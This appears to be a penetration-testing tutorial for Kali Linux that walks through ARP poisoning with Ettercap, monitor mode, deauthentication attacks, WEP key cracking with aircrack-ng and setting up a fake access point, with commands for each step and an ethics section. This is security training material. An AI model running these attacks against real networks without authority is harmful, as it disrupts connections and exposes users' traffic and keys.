# Setting Up Kali Linux for Network Penetration Testing

This guide covers setting up Kali Linux for various network penetration testing attacks, including ARP spoofing (ARP poisoning), monitor mode, and packet injection. These tools are commonly used for ethical hacking and network security assessments.

## Prerequisites

- A system running Kali Linux (or any Debian-based distribution).
- Basic knowledge of networking and ethical hacking.
- A compatible wireless network interface card (NIC) for packet injection and monitor mode.
- Permission to perform penetration testing in the network.

## Installing Necessary Tools

Kali Linux comes pre-installed with most of the tools needed for these attacks, such as **Ettercap**, **Wireshark**, and **aircrack-ng**. If not installed, follow the steps below to install them.

### 1. Update Kali Linux
Before installing or updating any tools, it’s a good practice to update your system.

```bash
sudo apt update && sudo apt upgrade -y
```

### 2. Install Ettercap (for ARP Spoofing)
Ettercap is used for performing ARP spoofing to intercept network traffic.

```bash
sudo apt install ettercap-graphical
```

### 3. Install Wireshark (for Packet Capture)
Wireshark is a powerful tool for capturing and analyzing network traffic.

```bash
sudo apt install wireshark
```

### 4. Install aircrack-ng (for Monitor Mode and Packet Injection)
The aircrack-ng suite includes tools for monitoring wireless networks and injecting packets.

```bash
sudo apt install aircrack-ng
```

## Configuring Monitor Mode and Packet Injection

To perform attacks like **deauthentication attacks**, **WEP cracking**, and **packet injection**, you will need a compatible wireless NIC that supports monitor mode and packet injection.

### 1. Enable Monitor Mode

Monitor mode allows your wireless adapter to listen to all wireless traffic in the vicinity, which is required for many wireless penetration testing attacks.

First, identify your wireless interface:

```bash
iwconfig
```

This will show the network interfaces. Look for your wireless NIC (typically `wlan0`, `wlan1`, etc.).

To enable monitor mode on your wireless interface:

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### 2. Verify Monitor Mode
You can verify that your NIC is in monitor mode by running:

```bash
iw dev wlan0 info
```

If the mode is set to **monitor**, then your interface is ready.

### 3. Enable Packet Injection

Packet injection allows you to send packets onto the network, which is crucial for performing certain attacks like **deauthentication** or **fake AP creation**.

To test packet injection, you can use **airmon-ng** or **aircrack-ng** to perform a basic packet injection test:

```bash
sudo aireplay-ng --test wlan0
```

If packet injection is supported, you'll see a success message.

## Performing Attacks

Now that you've set up the environment, here are a few attacks you can perform using Kali Linux.

### 1. ARP Spoofing with Ettercap

ARP Spoofing is used to intercept traffic between two devices on a network.

1. Open Ettercap in graphical mode:

   ```bash
   sudo ettercap -G
   ```

2. Select `Sniff` > `Unified Sniffing`.
3. Choose your network interface (e.g., `eth0`, `wlan0`).
4. Scan for hosts on the network by selecting `Hosts` > `Scan for Hosts`.
5. Select the target and the gateway from the list of hosts.
6. Start the ARP poisoning attack by selecting `Mitm` > `ARP poisoning` > `Sniff remote connections`.

Ettercap will poison the ARP cache of both the target and the gateway, intercepting traffic between them.

### 2. Packet Capturing with Wireshark

Wireshark is used to capture network traffic during attacks like ARP spoofing or to analyze general network activity.

1. Start Wireshark:

   ```bash
   sudo wireshark
   ```

2. Select the network interface (e.g., `eth0`, `wlan0`).
3. Start capturing packets by clicking the green shark icon.
4. You can filter the captured packets based on criteria like protocol type, IP address, etc.

### 3. Deauthentication Attack (using aircrack-ng)

Deauthentication attacks can be used to disconnect devices from a Wi-Fi network. This is often the first step in a **WEP cracking** attack.

1. Put your wireless NIC in monitor mode as shown above.
2. Scan for available networks:

   ```bash
   sudo airodump-ng wlan0
   ```

3. Find the target network (SSID) and the BSSID (MAC address of the router).
4. Launch the deauthentication attack:

   ```bash
   sudo aireplay-ng --deauth 10 -a <BSSID> -c <Client MAC> wlan0
   ```

   This will disconnect the target client from the router.

### 4. Cracking WEP Keys

WEP keys can be cracked using aircrack-ng after capturing enough packets from the target network.

1. Capture packets from the target network:

   ```bash
   sudo airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0
   ```

2. Once you have captured enough packets, use **aircrack-ng** to crack the WEP key:

   ```bash
   sudo aircrack-ng capture-01.cap
   ```

### 5. Fake Access Point (AP) Creation

You can create a fake access point to lure unsuspecting clients into connecting to it.

1. Use **airbase-ng** to create the fake AP:

   ```bash
   sudo airbase-ng -e "FakeAP" -c 6 wlan0
   ```

2. Clients will be able to see and connect to this fake AP.

## Stopping the Attacks

### 1. Disable Monitor Mode

To return to normal mode after using monitor mode, use the following commands:

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up
```

### 2. Stop ARP Poisoning

To stop ARP poisoning with Ettercap, select `Mitm` > `Stop ARP poisoning`.

### 3. Disable IP Forwarding

If you enabled IP forwarding for ARP poisoning, disable it when you're done:

```bash
sudo sysctl -w net.ipv4.ip_forward=0
```

## Ethical Considerations

- **Permission:** Always ensure that you have explicit permission to perform penetration testing on a network. Unauthorized attacks are illegal and unethical.
- **Impact:** Understand that these attacks can cause network disruptions. Perform them only in controlled, safe environments (e.g., lab setups or permission-granted networks).

## Conclusion

This setup guide demonstrates how to configure Kali Linux for various network attacks, including ARP spoofing, packet capturing, monitor mode, and packet injection. Use these techniques responsibly and for ethical purposes, such as improving network security.

For more information on the tools used in this guide, refer to their official documentation:
- [Ettercap Documentation](https://www.ettercap-project.org/)
- [Wireshark Documentation](https://www.wireshark.org/docs/)
- [aircrack-ng Documentation](https://www.aircrack-ng.org/)
